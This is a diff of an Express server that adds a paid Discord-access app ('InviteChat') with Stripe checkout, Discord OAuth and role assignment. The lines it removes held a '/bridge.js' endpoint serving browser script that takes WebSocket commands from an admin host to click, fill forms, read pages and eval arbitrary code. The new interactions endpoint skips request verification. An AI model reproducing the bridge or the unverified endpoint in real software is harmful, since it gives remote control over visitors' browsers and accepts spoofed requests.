@@ -1,167 +1,250 @@
 require('dotenv').config();
 const express = require('express');
+const session = require('express-session');
 const path = require('path');
+const Stripe = require('stripe');
+const { Client, GatewayIntentBits } = require('discord.js');
+
 const app = express();
+const stripe = Stripe(process.env.STRIPE_SECRET_KEY);
+
+// Discord bot setup
+const discordBot = new Client({
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers]
+});
+
+discordBot.once('ready', () => {
+    console.log(`Discord bot logged in as ${discordBot.user.tag}`);
+});
+
+discordBot.login(process.env.DISCORD_BOT_TOKEN).catch(err => {
+    console.error('Discord bot login failed:', err.message);
+});
 
 app.set('trust proxy', true);
 app.set('view engine', 'pug');
 app.set('views', path.join(__dirname, 'views'));
 
+// Middleware
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(session({
+    secret: process.env.SESSION_SECRET,
+    resave: false,
+    saveUninitialized: false,
+    cookie: { 
+        secure: process.env.PRODUCTION === 'true',
+        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+    }
+}));
+
 const PORT = process.env.PORT || 3000;
 
-// Serve bridge.js dynamically
-app.get('/bridge.js', (req, res) => {
-    const host = req.hostname;
-    const adminHost = host.startsWith('admin.') ? host : 'admin.' + host;
-    
-    res.type('application/javascript');
-    res.send(`
-(function() {
-    const ADMIN_URL = 'wss://${adminHost}/bridge';
-    
-    let ws;
-    let reconnectTimer;
-    let clientId = null;
-    
-    const handlers = {
-        navigate: async (action) => {
-            const url = action.url;
-            setTimeout(() => { window.location.href = url; }, 50);
-            return { navigating: url };
-        },
-        
-        fill: async (action) => {
-            const el = document.querySelector(action.selector);
-            if (!el) throw new Error('Element not found: ' + action.selector);
-            el.value = action.value;
-            el.dispatchEvent(new Event('input', { bubbles: true }));
-            el.dispatchEvent(new Event('change', { bubbles: true }));
-            return { filled: action.selector, value: action.value };
-        },
-        
-        click: async (action) => {
-            const el = document.querySelector(action.selector);
-            if (!el) throw new Error('Element not found: ' + action.selector);
-            el.click();
-            return { clicked: action.selector };
-        },
-        
-        type: async (action) => {
-            const el = document.querySelector(action.selector);
-            if (!el) throw new Error('Element not found: ' + action.selector);
-            el.focus();
-            for (const char of action.text) {
-                el.value += char;
-                el.dispatchEvent(new Event('input', { bubbles: true }));
-                await new Promise(r => setTimeout(r, action.delay || 20));
-            }
-            return { typed: action.text.length + ' chars' };
-        },
-        
-        wait: async (action) => {
-            if (action.selector) {
-                const start = Date.now();
-                const timeout = action.timeout || 10000;
-                while (Date.now() - start < timeout) {
-                    if (document.querySelector(action.selector)) {
-                        return { found: action.selector };
-                    }
-                    await new Promise(r => setTimeout(r, 100));
-                }
-                throw new Error('Timeout waiting for: ' + action.selector);
-            } else if (action.ms) {
-                await new Promise(r => setTimeout(r, action.ms));
-                return { waited: action.ms };
-            }
-        },
-        
-        eval: async (action) => {
-            const result = await eval(action.code);
-            if (result instanceof Element) return result.outerHTML;
-            if (result instanceof NodeList || Array.isArray(result)) {
-                return Array.from(result).map(el => el instanceof Element ? el.outerHTML : el);
-            }
-            return result;
-        },
-        
-        get: async (action) => {
-            const el = document.querySelector(action.selector);
-            if (!el) throw new Error('Element not found: ' + action.selector);
-            return {
-                text: el.innerText,
-                value: el.value,
-                html: action.html ? el.innerHTML : undefined
-            };
-        }
-    };
-    
-    function connect() {
-        if (ws && ws.readyState === WebSocket.OPEN) return;
-        
-        try {
-            ws = new WebSocket(ADMIN_URL);
-            
-            ws.onopen = () => {
-                console.log('[bridge] connected to', ADMIN_URL);
-                ws.send(JSON.stringify({ type: 'hello', url: location.href }));
-            };
-            
-            ws.onmessage = async (event) => {
-                try {
-                    const msg = JSON.parse(event.data);
-                    
-                    if (msg.type === 'welcome') {
-                        clientId = msg.clientId;
-                        console.log('[bridge] assigned client ID:', clientId);
-                        return;
-                    }
-                    
-                    if (msg.type === 'task') {
-                        let result, error;
-                        try {
-                            if (msg.action && handlers[msg.action.type]) {
-                                result = await handlers[msg.action.type](msg.action);
-                            } else if (msg.code) {
-                                result = await eval(msg.code);
-                                if (result instanceof Element) result = result.outerHTML;
-                                if (result instanceof NodeList || Array.isArray(result)) {
-                                    result = Array.from(result).map(el => el instanceof Element ? el.outerHTML : el);
-                                }
-                            }
-                        } catch (e) {
-                            error = e.message;
-                        }
-                        ws.send(JSON.stringify({ type: 'result', taskId: msg.taskId, result, error }));
-                    }
-                } catch (e) {
-                    console.error('[bridge] message error:', e);
-                }
-            };
-            
-            ws.onclose = () => {
-                console.log('[bridge] disconnected, reconnecting in 3s...');
-                clearTimeout(reconnectTimer);
-                reconnectTimer = setTimeout(connect, 3000);
-            };
-            
-            ws.onerror = (e) => {
-                console.error('[bridge] error:', e);
-            };
-        } catch (e) {
-            console.error('[bridge] connection error:', e);
-            clearTimeout(reconnectTimer);
-            reconnectTimer = setTimeout(connect, 3000);
-        }
-    }
-    
-    connect();
-})();
-`);
+// Home page - show payment page
+app.get('/', (req, res) => {
+    res.render('index', { 
+        title: 'InviteChat - Premium Access',
+        stripeKey: process.env.STRIPE_PUBLISHABLE_KEY,
+        user: req.session.user,
+        paid: req.session.paid
+    });
 });
 
-// Home page
-app.get('/', (req, res) => {
-    res.render('index', { title: 'Home' });
+// Create Stripe Checkout Session
+app.post('/create-checkout-session', async (req, res) => {
+    try {
+        const session = await stripe.checkout.sessions.create({
+            payment_method_types: ['card'],
+            line_items: [{
+                price_data: {
+                    currency: 'usd',
+                    product_data: {
+                        name: 'InviteChat Premium Access',
+                        description: 'Get exclusive Discord role and premium features'
+                    },
+                    unit_amount: 399, // $3.99
+                },
+                quantity: 1,
+            }],
+            mode: 'payment',
+            success_url: `https://${req.hostname}/payment-success?session_id={CHECKOUT_SESSION_ID}`,
+            cancel_url: `https://${req.hostname}/`,
+        });
+        
+        res.json({ url: session.url });
+    } catch (error) {
+        console.error('Stripe error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Payment success - verify and mark as paid
+app.get('/payment-success', async (req, res) => {
+    try {
+        const sessionId = req.query.session_id;
+        if (!sessionId) {
+            return res.redirect('/');
+        }
+        
+        const session = await stripe.checkout.sessions.retrieve(sessionId);
+        
+        if (session.payment_status === 'paid') {
+            req.session.paid = true;
+            req.session.stripeSessionId = sessionId;
+            res.render('payment-success', { 
+                title: 'Payment Successful',
+                user: req.session.user
+            });
+        } else {
+            res.redirect('/');
+        }
+    } catch (error) {
+        console.error('Payment verification error:', error);
+        res.redirect('/');
+    }
+});
+
+// Discord OAuth - initiate login
+app.get('/login', (req, res) => {
+    if (!req.session.paid) {
+        return res.redirect('/');
+    }
+    
+    const params = new URLSearchParams({
+        client_id: process.env.DISCORD_CLIENT_ID,
+        redirect_uri: process.env.DISCORD_REDIRECT_URI,
+        response_type: 'code',
+        scope: 'identify guilds.join'
+    });
+    
+    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
+});
+
+// Discord OAuth callback
+app.get('/redirect', async (req, res) => {
+    const code = req.query.code;
+    
+    if (!code) {
+        return res.redirect('/');
+    }
+    
+    try {
+        // Exchange code for token
+        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                client_id: process.env.DISCORD_CLIENT_ID,
+                client_secret: process.env.DISCORD_CLIENT_SECRET,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: process.env.DISCORD_REDIRECT_URI
+            })
+        });
+        
+        const tokens = await tokenResponse.json();
+        
+        if (tokens.error) {
+            console.error('Discord token error:', tokens);
+            return res.redirect('/?error=discord_auth_failed');
+        }
+        
+        // Get user info
+        const userResponse = await fetch('https://discord.com/api/users/@me', {
+            headers: {
+                Authorization: `Bearer ${tokens.access_token}`
+            }
+        });
+        
+        const user = await userResponse.json();
+        
+        req.session.user = {
+            id: user.id,
+            username: user.username,
+            discriminator: user.discriminator,
+            avatar: user.avatar,
+            accessToken: tokens.access_token
+        };
+        
+        // If user has paid, assign role
+        if (req.session.paid && process.env.DISCORD_GUILD_ID && process.env.DISCORD_ROLE_ID) {
+            try {
+                const guild = await discordBot.guilds.fetch(process.env.DISCORD_GUILD_ID);
+                const member = await guild.members.fetch(user.id).catch(() => null);
+                
+                if (member) {
+                    await member.roles.add(process.env.DISCORD_ROLE_ID);
+                    req.session.roleAssigned = true;
+                    console.log(`Assigned role to ${user.username} (${user.id})`);
+                } else {
+                    // User not in server, try to add them using OAuth token
+                    await fetch(`https://discord.com/api/guilds/${process.env.DISCORD_GUILD_ID}/members/${user.id}`, {
+                        method: 'PUT',
+                        headers: {
+                            Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`,
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            access_token: tokens.access_token,
+                            roles: [process.env.DISCORD_ROLE_ID]
+                        })
+                    });
+                    req.session.roleAssigned = true;
+                    console.log(`Added ${user.username} to server with role`);
+                }
+            } catch (err) {
+                console.error('Role assignment error:', err);
+            }
+        }
+        
+        res.redirect('/success');
+    } catch (error) {
+        console.error('Discord OAuth error:', error);
+        res.redirect('/?error=discord_auth_failed');
+    }
+});
+
+// Success page after Discord login
+app.get('/success', (req, res) => {
+    if (!req.session.user || !req.session.paid) {
+        return res.redirect('/');
+    }
+    
+    res.render('success', {
+        title: 'Welcome!',
+        user: req.session.user,
+        roleAssigned: req.session.roleAssigned
+    });
+});
+
+// API interactions endpoint (for Discord)
+app.post('/api/interactions', express.raw({ type: 'application/json' }), (req, res) => {
+    // Discord interaction verification would go here
+    // For now, just acknowledge
+    res.status(200).json({ type: 1 });
+});
+
+// Verify user endpoint
+app.get('/verify-user', (req, res) => {
+    res.render('verify-user', { title: 'Verify Your Account' });
+});
+
+// Terms of Service
+app.get('/terms-of-service', (req, res) => {
+    res.render('terms', { title: 'Terms of Service' });
+});
+
+// Privacy Policy
+app.get('/privacy-policy', (req, res) => {
+    res.render('privacy', { title: 'Privacy Policy' });
+});
+
+// Logout
+app.get('/logout', (req, res) => {
+    req.session.destroy();
+    res.redirect('/');
 });
 
 // 404 handler
@@ -184,5 +267,5 @@ app.use((err, req, res, next) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Main app running on port ${PORT}`);
+    console.log(`InviteChat running on port ${PORT}`);
 });
